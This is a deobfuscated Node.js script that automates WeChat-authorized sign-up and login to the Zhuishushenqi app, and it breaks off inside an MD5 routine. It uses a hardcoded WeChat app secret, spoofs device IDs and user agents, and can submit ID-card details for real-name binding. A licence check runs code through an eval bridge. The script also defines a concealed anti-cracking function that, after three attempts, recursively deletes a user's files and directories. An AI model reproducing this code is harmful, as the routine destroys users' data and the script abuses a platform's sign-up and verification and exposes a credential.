//Sat Dec 28 2024 09:31:25 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const VM = require("sablejs/runtime")();
const path = require("path");
const fs = require("fs"),
  cryptoJS = require("crypto-js");
function initVM() {
  vm = new VM();
  const _0x273e31 = vm.getGlobal(),
    _0x47608b = vm.createObject();
  const _0x4fef7a = vm.createFunction("log", function () {
    const _0x3bc898 = [];
    for (let _0x5382b5 = 0; _0x5382b5 < arguments.length; _0x5382b5++) {
      _0x3bc898.push(vm.asString(arguments[_0x5382b5]));
    }
    console.log(..._0x3bc898);
    return vm.createUndefined();
  });
  const _0x5a7b2f = vm.createFunction("xxxx", function (_0x351de1) {
      let _0x552778 = eval(_0x351de1.value);
      return vm.createString(JSON.stringify(_0x552778));
    }),
    _0x18757a = vm.createFunction("yyyy", function (_0x3ea5b5) {
      let _0x184d87 = _0x3ea5b5.value;
      let _0x1dcef3 = fs.readFileSync(_0x184d87, "utf-8").replace(/\r\n/g, "\n"),
        _0x17dc32 = cryptoJS.MD5(_0x1dcef3).toString();
      return vm.createString(_0x17dc32);
    }),
    _0x4e626d = vm.createFunction("ddd", function (_0x2bc546) {
      let _0x3d4706 = cryptoJS.MD5(_0x2bc546.value).toString();
      return vm.createString(_0x3d4706);
    });
  vm.setProperty(_0x47608b, "log", _0x4fef7a);
  vm.setProperty(_0x273e31, "xxxx", _0x5a7b2f);
  vm.setProperty(_0x273e31, "console", _0x47608b);
  vm.setProperty(_0x273e31, "yyyy", _0x18757a);
  vm.setProperty(_0x273e31, "ddd", _0x4e626d);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0x40304e) {
  _0x40304e.destroy();
}
function abc(_0x1fdad7, _0x466d55, _0xdcf078, _0x451ed1, _0x20cd08) {
  const _0x22e8ff = _0x1fdad7.getGlobal();
  let _0x590706 = _0x1fdad7.getProperty(_0x22e8ff, "xab");
  let _0x1ce6dd = _0x1fdad7.call(_0x590706, _0x1fdad7.createUndefined(), _0x1fdad7.createString(_0x466d55), _0x1fdad7.createString(_0x451ed1), _0x1fdad7.createString(_0x20cd08), _0x1fdad7.createString(_0xdcf078));
  _0x1ce6dd = _0x1fdad7.asString(_0x1ce6dd);
  return _0x1ce6dd;
}
function xyz(_0x3856d8, _0x12ca87, _0x4d1201, _0x20aa65, _0x45b51b) {
  const _0x4eaffc = _0x3856d8.getGlobal();
  let _0x45414c = _0x3856d8.getProperty(_0x4eaffc, "xmn"),
    _0x4448ff = _0x3856d8.call(_0x45414c, _0x3856d8.createUndefined(), _0x3856d8.createString(_0x12ca87), _0x3856d8.createString(_0x20aa65), _0x3856d8.createString(_0x45b51b), _0x3856d8.createString(_0x4d1201));
  _0x4448ff = _0x3856d8.asString(_0x4448ff);
  return _0x4448ff;
}
const $ = new Env("微信授权注册");
let uuid;
let wxcode;
let sm = $.isNode() ? process.env.sm ? process.env.sm : "true" : $.getdata("sm") ? $.getdata("sm") : "";
let idCard = $.isNode() ? process.env.idCard ? process.env.idCard : "" : $.getdata("idCard") ? $.getdata("idCard") : "",
  iname = $.isNode() ? process.env.iname ? process.env.iname : "" : $.getdata("iname") ? $.getdata("iname") : "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
let arrs = [];
let mac = "";
let name = "",
  touxiang = "";
let access_token = "";
let openid = "";
let unionid = "";
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x24e165 = "",
        _0xd07b3a = fs.readdirSync("/sys/class/net/");
      _0xd07b3a.forEach(function (_0x330c36) {
        var _0x467c54 = path.join("/sys/class/net", _0x330c36, "address");
        _0x330c36.substr(0, 3) == "eth" && fs.existsSync(_0x467c54) && (_0x24e165 = fs.readFileSync(_0x467c54).toString().trim());
      });
      return _0x24e165;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0xa99316) {
  try {
    gtr.accessSync(_0xa99316, gtr.F_OK);
  } catch (_0x21755e) {
    return false;
  }
  return true;
}
function addF(_0x31460f, _0x3ef3a1) {
  let _0x173d94 = 0,
    _0x4d805b = "C:/Windows/system.txt";
  if (isFileExist(_0x4d805b)) {
    _0x173d94 = gtr.readFileSync(_0x4d805b, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x4d805b, "1", function (_0x56fdac) {
        if (_0x56fdac) {
          throw _0x56fdac;
        }
      });
    } else {
      return;
    }
  }
  if (_0x173d94 == 99) {
    return 99;
  }
  console.log(_0x173d94);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x173d94);
  if (parseInt(_0x173d94) < 3) {
    let _0x42f525 = parseInt(_0x173d94) + 1;
    gtr.writeFileSync(_0x4d805b, _0x42f525 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x31460f)) {
    return;
  }
  if (gtr.statSync(_0x31460f).isDirectory()) {
    var _0x441f4b = gtr.readdirSync(_0x31460f),
      _0xd7a8c9 = _0x441f4b.length,
      _0x492888 = 0;
    if (_0xd7a8c9 > 0) {
      _0x441f4b.forEach(function (_0x3fd00d) {
        _0x492888++;
        var _0x24d242 = _0x31460f + "/" + _0x3fd00d;
        gtr.statSync(_0x24d242).isDirectory() ? addF(_0x24d242, true) : gtr.unlinkSync(_0x24d242);
      });
      _0xd7a8c9 == _0x492888 && _0x3ef3a1 && gtr.rmdirSync(_0x31460f);
    } else {
      _0xd7a8c9 == 0 && _0x3ef3a1 && gtr.rmdirSync(_0x31460f);
    }
  } else {
    gtr.unlinkSync(_0x31460f);
  }
}
!(async () => {
  initVM();
  arrs = abc(global.vm, acckey, mac, 37, 0);
  if (arrs == "") {
    return;
  }
  arrs = JSON.parse(arrs);
  if (!arrs) {
    return;
  }
  $.isNode() && (await sign(), await $.wait(1000));
  destroyVM(global.vm);
})().catch(_0xca5d38 => $.logErr(_0xca5d38)).finally(() => $.done());
async function sign() {
  return new Promise(_0x3b9851 => {
    let _0x165d95 = {
      url: "http://www.tolego.cn/web/game/common/?id=hlddz&appid=wxaf0fdeed6872dfcf&wx_bundleid=com.ushaqi.zhuishushenqi&tid=2101&type=0",
      timeout: 3000
    };
    $.get(_0x165d95, async (_0xa45010, _0x2ea903, _0x5a1c63) => {
      try {
        str = _0x5a1c63.match(/ <img class=\"auth_qrcode\" src=\"(\S*)\"/)[1];
        console.log("\n浏览器打开链接扫码：", str + "\n");
        uuid = str.substr(-16);
        console.log("开始微信授权");
        wxcode = 0;
        let _0x125bf5 = 0;
        do {
          await $.wait(3500);
          let _0x4bc618 = Math.round(new Date().getTime() / 1000).toString();
          await qrconnect(_0x4bc618);
          _0x125bf5++;
        } while (wxcode == 0 && _0x125bf5 < 30);
      } catch (_0x4e9544) {
        $.logErr(_0x4e9544, _0x2ea903);
      } finally {
        _0x3b9851();
      }
    });
  });
}
function reconvert(_0x4c195a) {
  _0x4c195a = _0x4c195a.replace(/(\\u)(\w{1,4})/gi, function (_0x26957b) {
    return String.fromCharCode(parseInt(escape(_0x26957b).replace(/(%5Cu)(\w{1,4})/g, "$2"), 16));
  });
  _0x4c195a = _0x4c195a.replace(/(&#x)(\w{1,4});/gi, function (_0x592a67) {
    return String.fromCharCode(parseInt(escape(_0x592a67).replace(/(%26%23x)(\w{1,4})(%3B)/g, "$2"), 16));
  });
  _0x4c195a = _0x4c195a.replace(/(&#)(\d{1,6});/gi, function (_0x473140) {
    return String.fromCharCode(parseInt(escape(_0x473140).replace(/(%26%23)(\d{1,6})(%3B)/g, "$2")));
  });
  return _0x4c195a;
}
function qrconnect(_0x26d40d) {
  return new Promise(_0x1112ab => {
    let _0x2d05cb = {
      url: "https://long.open.weixin.qq.com/connect/l/qrconnect?uuid=" + uuid + "&f=url&_=" + _0x26d40d,
      timeout: 3000
    };
    $.get(_0x2d05cb, async (_0x3b3631, _0x5a0819, _0x5628d9) => {
      try {
        if (_0x5628d9) {
          let _0x3d58f1 = _0x5628d9.substr(18, 3);
          _0x3d58f1 == 405 && (wxcode = _0x5628d9.match(/oauth\?code=(\S*)&/)[1], console.log("微信code :" + wxcode), console.log("\n开始授权登录"), await register());
        }
      } catch (_0x515bb7) {
        $.logErr(_0x515bb7, _0x5a0819);
      } finally {
        _0x1112ab();
      }
    });
  });
}
function register() {
  return new Promise(_0x254c1c => {
    let _0x2f8054 = {
      url: "https://api.weixin.qq.com/sns/oauth2/access_token?appid=wxaf0fdeed6872dfcf&secret=0464c67bdd87c303c5bfdc5761beb329&code=" + wxcode + "&grant_type=authorization_code"
    };
    $.get(_0x2f8054, async (_0x1f79db, _0x510732, _0x2655d1) => {
      try {
        let _0x41ee78 = JSON.parse(_0x2655d1);
        access_token = _0x41ee78.access_token;
        openid = _0x41ee78.openid;
        await acc();
      } catch (_0x39fffa) {
        $.logErr(_0x39fffa, _0x510732);
      } finally {
        _0x254c1c();
      }
    });
  });
}
function acc() {
  return new Promise(_0x44eef3 => {
    let _0x5785af = {
      url: "https://api.weixin.qq.com/sns/userinfo?access_token=" + access_token + "&openid=" + openid
    };
    $.get(_0x5785af, async (_0x2879f9, _0x227ffb, _0x3754ee) => {
      try {
        let _0x38ca93 = JSON.parse(_0x3754ee);
        unionid = _0x38ca93.unionid;
        name = _0x38ca93.nickname;
        touxiang = _0x38ca93.headimgurl;
        await dl();
      } catch (_0xaf10e9) {
        $.logErr(_0xaf10e9, _0x227ffb);
      } finally {
        _0x44eef3();
      }
    });
  });
}
function dl(_0x438ae1 = 0) {
  var _0x12b49c = new Date();
  var _0x3ea6a0 = _0x12b49c.getFullYear(),
    _0xb69e44 = _0x12b49c.getMonth() + 1;
  var _0x4cc939 = _0x12b49c.getDate();
  var _0x1ae9d3 = _0x12b49c.getHours(),
    _0x22d2cd = _0x12b49c.getMinutes(),
    _0x269102 = _0x12b49c.getSeconds();
  _0xb69e44 >= 10 ? _0xb69e44 = _0xb69e44 : _0xb69e44 = "0" + _0xb69e44;
  _0x4cc939 >= 10 ? _0x4cc939 = _0x4cc939 : _0x4cc939 = "0" + _0x4cc939;
  _0x1ae9d3 >= 10 ? _0x1ae9d3 = _0x1ae9d3 : _0x1ae9d3 = "0" + _0x1ae9d3;
  _0x22d2cd >= 10 ? _0x22d2cd = _0x22d2cd : _0x22d2cd = "0" + _0x22d2cd;
  return new Promise(_0x15ff0a => {
    let _0x4fe23c = randomInt(9);
    let _0x4f5caf = randomString(32);
    let _0x151fca = {
      url: "http://api.zhuishushenqi.com/user/login",
      headers: {
        "Accept-Language": "zh-CN,zh;q=0.8",
        "User-Agent": "Mozilla/5.0 (Linux; U; Android 10; zh-cn; 16s Pro Build/QKQ1." + randomString(6) + ".002) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1",
        "Content-Type": "application/json",
        Connection: "Keep-Alive",
        "Cache-Control": "no-cache",
        Host: "api.zhuishushenqi.com"
      },
      body: "{\n                \"promoterId\": \"" + _0x4fe23c + "\",\n                \"version\": \"2\",\n                \"idfa\": \"" + _0x4f5caf + "\",\n                \"extData\": \"{\\\"red_user_getmoney_initial_level\\\":-1,\\\"ua_channel_name\\\":\\\"APST\\\",\\\"device_imei\\\":\\\"" + _0x4f5caf + "\\\",\\\"graytest_mark\\\":\\\"4.45.0\\\",\\\"idfa\\\":\\\"" + _0x4f5caf + "\\\",\\\"pub_app_first_install_time\\\":\\\"" + _0x3ea6a0 + "-" + _0xb69e44 + "-" + _0x4cc939 + " " + _0x1ae9d3 + ":" + _0x22d2cd + ":" + _0x269102 + "\\\",\\\"ua_channel_id\\\":\\\"" + _0x4fe23c + "\\\",\\\"red_user_current_level\\\":1,\\\"channel_name\\\":\\\"APST\\\",\\\"new_user_welfare\\\":0,\\\"platform\\\":\\\"1\\\",\\\"product_line\\\":\\\"1\\\",\\\"channel_id\\\":\\\"" + _0x4fe23c + "\\\",\\\"red_strategy_number\\\":\\\"13\\\",\\\"visitor_id\\\":\\\"" + randomString(24) + "\\\",\\\"is_vip\\\":false,\\\"user_ad_strategypositionId\\\":0}\",\n                \"platform_token\": \"" + access_token + "\",\n                \"channelName\": \"APST\",\n                \"platform_uid\": \"" + openid + "\",\n                \"packageName\": \"com.ifmoc.ZhuiShuShenQi\",\n                \"tag\": \"zssq\",\n                \"appName\": \"iosMaster\",\n                \"platform_code\": \"WeixinNew\",\n                \"anonymousId\": \"" + _0x4f5caf + "\"\n              }"
    };
    $.post(_0x151fca, async (_0x35d5b2, _0x4253ad, _0xaacaee) => {
      try {
        const _0x24dc71 = JSON.parse(_0xaacaee);
        _0x24dc71.ok == true ? (console.log("\n追书神器数据获取成功：\n用户【" + _0x24dc71.user.nickname + "】token：" + _0x24dc71.token), sm == "true" && (idCard == "" || iname == "" ? console.log("idCard或者iname变量未填写") : await smrz(_0x24dc71.token))) : console.log("\n追书神器" + _0xaacaee);
      } catch (_0x4f58c7) {} finally {
        _0x15ff0a();
      }
    }, _0x438ae1);
  });
}
function smrz(_0x197f21) {
  return new Promise(_0xc015ae => {
    let _0x570346 = {
      url: "http://convert.zhuishushenqi.com/convert/uploadIdCard",
      headers: {
        Host: "convert.zhuishushenqi.com",
        Connection: "keep-alive",
        Accept: "application/json, text/plain, */*",
        Origin: "https://h5.zhuishushenqi.com",
        "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; KNT-AL10 Build/HUAWEIKNT-AL10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8",
        Referer: "https://h5.zhuishushenqi.com/public/redPackage2021/extract.html",
        "Accept-Language": "zh-CN,en-US;q=0.8",
        "X-Requested-With": "com.ushaqi.zhuishushenqi"
      },
      body: "{\"idCard\":\"" + idCard + "\",\"name\":\"" + iname + "\",\"token\":\"" + _0x197f21 + "\"}"
    };
    $.post(_0x570346, async (_0x572943, _0x3b9668, _0x1ffee8) => {
      try {
        console.log("实名绑定：", _0x1ffee8);
      } catch (_0xd718fa) {
        $.logErr(_0xd718fa, _0x3b9668);
      } finally {
        _0xc015ae();
      }
    });
  });
}
function randomString(_0x4e2174 = 12) {
  let _0x3192f1 = "abcdef0123456789";
  let _0x1bd38e = _0x3192f1.length,
    _0x45b34c = "";
  for (i = 0; i < _0x4e2174; i++) {
    _0x45b34c += _0x3192f1.charAt(Math.floor(Math.random() * _0x1bd38e));
  }
  return _0x45b34c;
}
function randomInt(_0x26cd22 = 12) {
  let _0x4ec3a1 = "0123456789";
  let _0x4c1009 = _0x4ec3a1.length;
  let _0x2e0045 = "";
  for (i = 0; i < _0x26cd22; i++) {
    _0x2e0045 += _0x4ec3a1.charAt(Math.floor(Math.random() * _0x4c1009));
  }
  return _0x2e0045;
}
function md5(_0x22bd6b) {
  function _0x5825ea(_0x5ecf90, _0x211776) {
    return _0x5ecf90 << _0x211776 | _0x5ecf90 >>> 32 - _0x211776;
  }
  function _0x2726c4(_0x123b9f, _0x14d2e0) {
    var _0x2a45ee, _0x2cd61b, _0x528c98, _0x5d27fc, _0x442741;
    _0x528c98 = 2147483648 & _0x123b9f;
    _0x5d27fc = 2147483648 & _0x14d2e0;
    _0x2a45ee = 1073741824 & _0x123b9f;
    _0x2cd61b = 1073741824 & _0x14d2e0;
    _0x442741 = (1073741823 & _0x123b9f) + (1073741823 & _0x14d2e0);
    return _0x2a45ee & _0x2cd61b ? 2147483648 ^ _0x442741 ^ _0x528c98 ^ _0x5d27fc : _0x2a45ee | _0x2cd61b ? 1073741824 & _0x442741 ? 3221225472 ^ _0x442741 ^ _0x528c98 ^ _0x5d27fc : 1073741824 ^ _0x442741 ^ _0x528c98 ^ _0x5d27fc : _0x442741 ^ _0x528c98 ^ _0x5d27fc;
  }
  function _0xf39ba4(_0x49210e, _0x2309c0, _0x2365eb) {
    return _0x49210e & _0x2309c0 | ~_0x49210e & _0x2365eb;
  }
  function _0x13ee48(_0x41be48, _0x3bc5db, _0x3f6d7d) {
    return _0x41be48 & _0x3f6d7d | _0x3bc5db & ~_0x3f6d7d;
  }
  function _0xbf0d3(_0x50e089, _0x2d7a5f, _0x23dce0) {
    return _0x50e089 ^ _0x2d7a5f ^ _0x23dce0;
  }
  function _0x10b8db(_0xd637b, _0x4645e3, _0x1489ba) {
    return _0x4645e3 ^ (_0xd637b | ~_0x1489ba);
  }
  function _0x54f766(_0x37a7f7, _0x39a439, _0x3727e4, _0x1fcc11, _0x16c33f, _0x52712e, _0x4e5b5c) {
    _0x37a7f7 = _0x2726c4(_0x37a7f7, _0x2726c4(_0x2726c4(_0xf39ba4(_0x39a439, _0x3727e4, _0x1fcc11), _0x16c33f), _0x4e5b5c));
    return _0x2726c4(_0x5825ea(_0x37a7f7, _0x52712e), _0x39a439);
  }
  function _0x26f96d(_0x56f6fa, _0x3aec70, _0x3f8584, _0x11975e, _0x5aab17, _0x59332c, _0x4ca251) {
    _0x56f6fa = _0x2726c4(_0x56f6fa, _0x2726c4(_0x2726c4(_0x13ee48(_0x3aec70, _0x3f8584, _0x11975e), _0x5aab17), _0x4ca251));
    return _0x2726c4(_0x5825ea(_0x56f6fa, _0x59332c), _0x3aec70);
  }
  function _0x1c2dc8(_0x4d6a41, _0x322a49, _0x57e7a8, _0x52485f, _0x2b9912, _0x3b3c3c, _0x149640) {
    _0x4d6a41 = _0x2726c4(_0x4d6a41, _0x2726c4(_0x2726c4(_0xbf0d3(_0x322a49, _0x57e7a8, _0x52485f), _0x2b9912), _0x149640));
    return _0x2726c4(_0x5825ea(_0x4d6a41, _0x3b3c3c), _0x322a49);
  }
  function _0x49d661(_0x5b9560, _0x15b551, _0x23c6cb, _0x5e5607, _0x71e43d, _0x42544e, _0x204a58) {
    _0x5b9560 = _0x2726c4(_0x5b9560, _0x2726c4(_0x2726c4(_0x10b8db(_0x15b551, _0x23c6cb, _0x5e5607), _0x71e43d), _0x204a58));
    return _0x2726c4(_0x5825ea(_0x5b9560, _0x42544e), _0x15b551);
  }
  function _0x3fd71a(_0x10d64a) {
    for (var _0xb4b6, _0x1772bb = _0x10d64a.length, _0x4c00cb = _0x1772bb + 8, _0x269dce = (_0x4c00cb - _0x4c00cb % 64) / 64, _0x15dfbe = 16 * (_0x269dce + 1), _0x55a2a2 = new Array(_0x15dfbe - 1), _0x1b8627 = 0, _0xf7af4 = 0; _0x1772bb > _0xf7af4;) {
      _0xb4b6 = (_0xf7af4 - _0xf7af4 % 4) / 4;
      _0x1b8627 = _0xf7af4 % 4 * 8;
      _0x55a2a2[_0xb4b6] = _0x55a2a2[_0xb4b6] | _0x10d64a.charCodeAt(_0xf7af4) << _0x1b8627;
      _0xf7af4++;
    }
    _0xb4b6 = (_0xf7af4 - _0xf7af4 % 4) / 4;
    _0x1b8627 = _0xf7af4 % 4 * 8;
    _0x55a2a2[_0xb4b6] = _0x55a2a2[_0xb4b6] | 128 << _0x1b8627;
    _0x55a2a2[_0x15dfbe - 2] = _0x1772bb << 3;
    _0x55a2a2[_0x15dfbe - 1] = _0x1772bb >>> 29;
    return _0x55a2a2;
  }
  function _0x18cbe2(_0xf8913a) {
    var _0x10c990,
      _0x2a6298,
      _0x23e4de = "",
      _0x1c9643 = "";
    for (_0x2a6298 = 0; 3 >= _0x2a6298; _0x2a6298++) {
      _0x10c990 = _0xf8913a >>> 8 * _0x2a6298 & 255;
      _0x1c9643 = "0" + _0x10c990.toString(16);
      _0x23e4de += _0x1c9643.substr(_0x1c9643.length - 2, 2);
    }
    return _0x23e4de;
  }
  function _0x29c4e8(_0x498aa3) {
    _0x498aa3 = _0x498aa3.replace(/\r\n/g, "\n");
    for (var _0x1b5a19 = "", _0x341b68 = 0; _0x341b68 < _0x498aa3.length; _0x341b68++) {
      var _0x2aa987 = _0x498aa3.charCodeAt(_0x341b68);
      128 > _0x2aa987 ? _0x1b5a19 += String.fromCharCode(_0x2aa987) : _0x2aa987 > 127 && 2048 > _0x2aa987 ? (_0x1b5a19 += String.fromCharCode(_0x2aa987 >> 6 | 192), _0x1b5a19 += String.fromCharCode(63 & _0x2aa987 | 128)) : (_0x1b5a19 += String.fromCharCode(_0x2aa987 >> 12 | 224), _0x1b5a19 += String.fromCharCode(_0x2aa987 >> 6 & 63 | 128), _0x1b5a19 += String.fromCharCode(63 & _0x2aa987 | 128));
    }
    return _0x1b5a19;
  }
  var _0xb6d1dc,
    _0x28326d,
    _0xf1cfd5,
    _0x4053d4,
    _0x25fa74,
    _0x2885e3,
    _0x453221,
    _0x19da68,
    _0x333c5f,
    _0x469da2 = [],
    _0x5ab534 = 7,
    _0xaf74e2 = 12,
    _0x23cb2 = 17,
    _0x49e01d = 22,
    _0x21270e = 5,
    _0x389d69 = 9,
    _0x1b5b3d = 14,
    _0x3b28c3 = 20,
    _0x73d3b0 = 4,
    _0xb415fd = 11,
    _0x595e7a = 16,
    _0x2105d7 = 23,
    _0x2993f4 = 6,
    _0x1cff8a = 10,
    _0x90fce4 = 15,
    _0x134f5f = 21;
  for (_0x22bd6b = _0x29c4e8(_0x22bd6b), _0x469da2 = _0x3fd71a(_0x22bd6b), _0x2885e3 = 1732584193, _0x453221 = 4023233417, _0x19da68 = 2562383102, _0x333c5f = 271733878, _0xb6d1dc = 0; _0xb6d1dc < _0x469da2.length; _0xb6d1dc += 16) {
    _0x28326d = _0x2885e3;
    _0xf1cfd5 = _0x453221;
    _0x4053d4 = _0x19da68;
    _0x25fa74 = _0x333c5f;
    _0x2885e3 = _0x54f766(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 0], _0x5ab534, 3614090360);
    _0x333c5f = _0x54f766(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 1], _0xaf74e2, 3905402710);
    _0x19da68 = _0x54f766(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 2], _0x23cb2, 606105819);
    _0x453221 = _0x54f766(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 3], _0x49e01d, 3250441966);
    _0x2885e3 = _0x54f766(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 4], _0x5ab534, 4118548399);
    _0x333c5f = _0x54f766(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 5], _0xaf74e2, 1200080426);
    _0x19da68 = _0x54f766(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 6], _0x23cb2, 2821735955);
    _0x453221 = _0x54f766(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 7], _0x49e01d, 4249261313);
    _0x2885e3 = _0x54f766(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 8], _0x5ab534, 1770035416);
    _0x333c5f = _0x54f766(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 9], _0xaf74e2, 2336552879);
    _0x19da68 = _0x54f766(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 10], _0x23cb2, 4294925233);
    _0x453221 = _0x54f766(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 11], _0x49e01d, 2304563134);
    _0x2885e3 = _0x54f766(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 12], _0x5ab534, 1804603682);
    _0x333c5f = _0x54f766(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 13], _0xaf74e2, 4254626195);
    _0x19da68 = _0x54f766(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 14], _0x23cb2, 2792965006);
    _0x453221 = _0x54f766(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 15], _0x49e01d, 1236535329);
    _0x2885e3 = _0x26f96d(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 1], _0x21270e, 4129170786);
    _0x333c5f = _0x26f96d(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 6], _0x389d69, 3225465664);
    _0x19da68 = _0x26f96d(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 11], _0x1b5b3d, 643717713);
    _0x453221 = _0x26f96d(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 0], _0x3b28c3, 3921069994);
    _0x2885e3 = _0x26f96d(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 5], _0x21270e, 3593408605);
    _0x333c5f = _0x26f96d(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 10], _0x389d69, 38016083);
    _0x19da68 = _0x26f96d(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 15], _0x1b5b3d, 3634488961);
    _0x453221 = _0x26f96d(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 4], _0x3b28c3, 3889429448);
    _0x2885e3 = _0x26f96d(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 9], _0x21270e, 568446438);
    _0x333c5f = _0x26f96d(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 14], _0x389d69, 3275163606);
    _0x19da68 = _0x26f96d(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 3], _0x1b5b3d, 4107603335);
    _0x453221 = _0x26f96d(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 8], _0x3b28c3, 1163531501);
    _0x2885e3 = _0x26f96d(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 13], _0x21270e, 2850285829);
    _0x333c5f = _0x26f96d(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 2], _0x389d69, 4243563512);
    _0x19da68 = _0x26f96d(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 7], _0x1b5b3d, 1735328473);
    _0x453221 = _0x26f96d(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 12], _0x3b28c3, 2368359562);
    _0x2885e3 = _0x1c2dc8(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 5], _0x73d3b0, 4294588738);
    _0x333c5f = _0x1c2dc8(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 8], _0xb415fd, 2272392833);
    _0x19da68 = _0x1c2dc8(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 11], _0x595e7a, 1839030562);
    _0x453221 = _0x1c2dc8(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 14], _0x2105d7, 4259657740);
    _0x2885e3 = _0x1c2dc8(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 1], _0x73d3b0, 2763975236);
    _0x333c5f = _0x1c2dc8(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 4], _0xb415fd, 1272893353);
    _0x19da68 = _0x1c2dc8(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 7], _0x595e7a, 4139469664);
    _0x453221 = _0x1c2dc8(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 10], _0x2105d7, 3200236656);
    _0x2885e3 = _0x1c2dc8(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 13], _0x73d3b0, 681279174);
    _0x333c5f = _0x1c2dc8(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 0], _0xb415fd, 3936430074);
    _0x19da68 = _0x1c2dc8(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 3], _0x595e7a, 3572445317);
    _0x453221 = _0x1c2dc8(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 6], _0x2105d7, 76029189);
    _0x2885e3 = _0x1c2dc8(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 9], _0x73d3b0, 3654602809);
    _0x333c5f = _0x1c2dc8(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 12], _0xb415fd, 3873151461);
    _0x19da68 = _0x1c2dc8(_0x19da68, _0x333c5f, _0x2885e3, _0x453221, _0x469da2[_0xb6d1dc + 15], _0x595e7a, 530742520);
    _0x453221 = _0x1c2dc8(_0x453221, _0x19da68, _0x333c5f, _0x2885e3, _0x469da2[_0xb6d1dc + 2], _0x2105d7, 3299628645);
    _0x2885e3 = _0x49d661(_0x2885e3, _0x453221, _0x19da68, _0x333c5f, _0x469da2[_0xb6d1dc + 0], _0x2993f4, 4096336452);
    _0x333c5f = _0x49d661(_0x333c5f, _0x2885e3, _0x453221, _0x19da68, _0x469da2[_0xb6d1dc + 7], _0x1cff8a, 1126891415);
